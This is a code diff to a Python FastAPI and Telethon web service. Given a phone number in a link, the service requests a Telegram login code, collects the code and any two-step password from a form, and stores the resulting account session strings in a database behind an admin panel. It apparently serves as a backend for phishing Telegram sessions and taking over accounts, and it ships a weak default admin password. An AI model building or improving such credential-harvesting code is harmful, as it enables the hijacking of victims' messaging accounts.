@@ -12,31 +12,54 @@ templates = Jinja2Templates(directory=".")
 
 API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
-ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")  # CHANGE THIS!
+ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")
 DB = "sessions.db"
-
-# In-memory clients: phone → client + hash
-CLIENTS = {}
 
 # === DATABASE ===
 def init_db():
     conn = sqlite3.connect(DB)
+    conn.execute("""
+    CREATE TABLE IF NOT EXISTS pending (
+        phone TEXT PRIMARY KEY,
+        hash TEXT,
+        time TEXT
+    )
+    """)
     conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
     conn.close()
 
-# Clear DB on start (remove after first deploy)
 if os.getenv("CLEAR_DB") == "1":
-    if os.path.exists(DB):
-        os.remove(DB)
+    if os.path.exists(DB): os.remove(DB)
     os.environ.pop("CLEAR_DB", None)
 
 init_db()
+
+def save_pending(phone: str, hash: str):
+    conn = sqlite3.connect(DB)
+    conn.execute("REPLACE INTO pending (phone, hash, time) VALUES (?, ?, datetime('now'))", (phone, hash))
+    conn.commit()
+    conn.close()
+
+def get_pending(phone: str):
+    conn = sqlite3.connect(DB)
+    c = conn.cursor()
+    c.execute("SELECT hash FROM pending WHERE phone = ?", (phone,))
+    row = c.fetchone()
+    conn.close()
+    return row[0] if row else None
+
+def delete_pending(phone: str):
+    conn = sqlite3.connect(DB)
+    conn.execute("DELETE FROM pending WHERE phone = ?", (phone,))
+    conn.commit()
+    conn.close()
 
 def save_session(phone: str, session: str):
     conn = sqlite3.connect(DB)
     conn.execute("REPLACE INTO sessions (phone, session, time) VALUES (?, ?, datetime('now'))", (phone, session))
     conn.commit()
     conn.close()
+    delete_pending(phone)
 
 def delete_session(phone: str):
     conn = sqlite3.connect(DB)
@@ -50,22 +73,18 @@ async def home(request: Request):
     phone = request.query_params.get("phone")
     if not phone:
         raise HTTPException(400, "Phone required")
-    # Clear old client
-    if phone in CLIENTS:
-        del CLIENTS[phone]
+    delete_pending(phone)
     delete_session(phone)
     return templates.TemplateResponse("index.html", {"request": request, "phone": phone})
 
 @app.post("/send")
 async def send_code(phone: str = Form(...)):
-    if phone in CLIENTS:
-        return JSONResponse({"error": "Already in progress"})
-
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     try:
         await client.connect()
         sent = await client.send_code_request(phone)
-        CLIENTS[phone] = {"client": client, "hash": sent.phone_code_hash}
+        save_pending(phone, sent.phone_code_hash)
+        await client.disconnect()
         return JSONResponse({"ok": True, "hash": sent.phone_code_hash})
     except Exception as e:
         if client.is_connected():
@@ -74,17 +93,13 @@ async def send_code(phone: str = Form(...)):
 
 @app.post("/verify")
 async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form(""), hash: str = Form("")):
-    if phone not in CLIENTS:
-        return JSONResponse({"error": "Session expired. Try again."})
+    stored_hash = get_pending(phone)
+    if not stored_hash or hash != stored_hash:
+        return JSONResponse({"error": "Session expired or invalid hash. Try again."})
 
-    data = CLIENTS[phone]
-    client = data["client"]
-    stored_hash = data["hash"]
-
-    if hash != stored_hash:
-        return JSONResponse({"error": "Invalid hash"})
-
+    client = TelegramClient(StringSession(), API_ID, API_HASH)
     try:
+        await client.connect()
         if pwd:
             await client.sign_in(phone, code, password=pwd, phone_code_hash=stored_hash)
         else:
@@ -92,7 +107,6 @@ async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form(
         session_str = client.session.save()
         await client.disconnect()
         save_session(phone, session_str)
-        del CLIENTS[phone]
         return JSONResponse({"session": session_str})
     except SessionPasswordNeededError:
         return JSONResponse({"needs_password": True})
@@ -100,6 +114,9 @@ async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form(
         return JSONResponse({"error": "Wrong code"})
     except Exception as e:
         return JSONResponse({"error": str(e)})
+    finally:
+        if client.is_connected():
+            await client.disconnect()
 
 # === ADMIN PANEL ===
 @app.get("/admin")
